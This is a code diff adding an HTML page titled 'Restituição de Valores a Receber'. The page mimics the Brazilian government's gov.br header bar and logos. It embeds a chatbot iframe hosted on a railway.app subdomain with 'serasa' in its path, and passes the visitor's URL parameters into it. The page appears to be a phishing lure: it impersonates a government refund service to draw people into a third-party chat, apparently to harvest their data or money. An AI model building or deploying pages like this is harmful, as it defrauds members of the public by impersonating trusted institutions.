@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Restituição de Valores a Receber</title>
+    <link href="css/JexYaIojwoxY.css" rel="stylesheet">
+</head>
+
+<body onload="passIframeData()">
+    <div id="barra-brasil">
+        <div class="conteudo-barra-brasil">
+            <img src="images/3barras.png" alt="Primeira imagem" class="pic-gov" style="width: 20px;">
+            <img src="images/enGAx8KcDq83-removebg-preview.png" alt="Segunda imagem" class="pic-gov" style="width: 130px;">
+            <img src="images/shield.png" alt="Terceira imagem" class="pic-gov" class="pic-gov" style="width: 20px;">
+        </div>
+    </div>
+    <img src="images/Screenshot_110-removebg-preview-1-768x275.png" class="logo-gov" alt="">
+    <img src="images/costuma responder em 2 minutos.png" class="logo-2minutos">
+    <div class="container-center">
+        <div class="card-typebot">
+            <iframe id="myIframe" src="https://viewer-production-6ed8.up.railway.app/serasa-api-0exwgek"></iframe>
+            <div class="footer">
+                <span>
+                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 576 512" height="1em"
+                        width="1em" xmlns="http://www.w3.org/2000/svg">
+                        <path
+                            d="M528 0H48C21.5 0 0 21.5 0 48v320c0 26.5 21.5 48 48 48h192l-16 48h-72c-13.3 0-24 10.7-24 24s10.7 24 24 24h272c13.3 0 24-10.7 24-24s-10.7-24-24-24h-72l-16-48h192c26.5 0 48-21.5 48-48V48c0-26.5-21.5-48-48-48zm-16 352H64V64h448v288z">
+                        </path>
+                    </svg>
+                    3.0.1213
+                </span>
+                <span>
+                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em"
+                        width="1em" xmlns="http://www.w3.org/2000/svg">
+                        <path
+                            d="M480 160H32c-17.673 0-32-14.327-32-32V64c0-17.673 14.327-32 32-32h448c17.673 0 32 14.327 32 32v64c0 17.673-14.327 32-32 32zm-48-88c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm-64 0c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm112 248H32c-17.673 0-32-14.327-32-32v-64c0-17.673 14.327-32 32-32h448c17.673 0 32 14.327 32 32v64c0 17.673-14.327 32-32 32zm-48-88c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm-64 0c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm112 248H32c-17.673 0-32-14.327-32-32v-64c0-17.673 14.327-32 32-32h448c17.673 0 32 14.327 32 32v64c0 17.673-14.327 32-32 32zm-48-88c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm-64 0c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24z">
+                        </path>
+                    </svg>
+                    3.0.4801
+                </span>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        function passIframeData() {
+            var a = document.querySelector("iframe"),
+                e = new URL(a.src);
+            new URL(window.location.href).searchParams.forEach(((a, r) => e.searchParams.set(r, a))), a.src = e.href
+        }
+    </script>
+    <style>
+        #barra-brasil {
+            background-color: #F71B82;
+            box-sizing: content-box;
+            display: flex;
+            flex-direction: column-reverse;
+            align-items: center
+        }
+        #barra-brasil .conteudo-barra-brasil {
+            height: 40px;
+            width: 95%;
+            max-width: 100vw;
+            margin: auto ;
+            height: 60px;
+            display: flex;
+            flex-flow: row nowrap;
+            align-items: center;
+            justify-content: space-between
+        }
+        html {
+            width: 100%;
+            height: 100%;
+            display: flex
+        }
+        body {
+            margin: 0;
+            padding: 0;
+            scroll-behavior: smooth;
+            font-family: Source Sans Pro,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Fira Sans,Droid Sans,Helvetica Neue,sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            flex-direction: column;
+            font-style: normal;
+            font-weight: 200;
+            font-size: 2px;
+            line-height: 1.3;
+            letter-spacing: 1px
+        }
+        .pic-gov {
+	     margin-right: 25px; /* Espaçamento entre cada imagem */
+        }
+        #root,body {
+            display: flex;
+            flex: 1 1
+        }
+        #root {
+            min-height: 0
+        }
+    </style> 
+</body>
+
+</html>
